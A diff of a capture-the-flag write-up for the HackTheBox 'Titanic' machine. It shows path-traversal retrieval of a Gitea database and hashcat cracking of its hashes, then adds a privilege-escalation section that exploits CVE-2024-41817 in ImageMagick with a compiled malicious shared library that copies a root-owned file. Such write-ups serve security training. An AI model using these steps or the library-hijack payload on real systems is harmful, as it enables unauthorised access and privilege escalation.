@@ -41,7 +41,7 @@ From the configure we find out the path to the database
 curl -s "http://titanic.htb/download?ticket=/home/developer/gitea/data/gitea/gitea.db" -o gitea.db
 ```
 
-Open `gitea.db` in SQLite:
+Open `gitea.db` in SQLite: 
 ```
 sqlite3 gitea.db  
 sqlite> .tables  
@@ -57,9 +57,40 @@ hashcat -m 10900 gitea_hash.txt rockyou.txt
 ```
 ### Privesc
 
+[[find]] directories w write perms
+```sh
+find /opt -writable -type d 2>/dev/null
+```
 
+A quick `sudo -l` check reveals no direct sudo privileges. Exploring `/opt`, we find a `scripts` folder containing `identify_images.sh`. Inspecting the file, we see it calls ImageMagick’s `identify` command on uploaded images.
 
+find path to magick and version using 
+```
+$ which magick
+/usr/bin/magick
 
+$ /usr/bin/magick --version
+Version: ImageMagick 7.1.1-35
+```
+
+There is a matching CVE-2024-41817 under this version that allows arbitrary code execution by loading malicious shared libraries into the current working directory when running `ImageMagick`: [Github](https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-8rxc-922v-phg8)
+
+From identify_images.sh we know that the directory we need is /opt/app/static/assets/images/. Let’s create a library that will copy the /root/root.txt file and change its permissions:
+
+```sh
+gcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+__attribute__((constructor)) void init(){
+    system("cp /root/root.txt root.txt; chmod 754 root.txt");
+    exit(0);
+}
+EOF
+```
+
+After a few seconds, a flag will appear in the directory
 ### References
 https://app.hackthebox.com/machines/648
 https://www.pentestnotes.ru/en/writeups/hackthebox/titanic-htb-writeup/
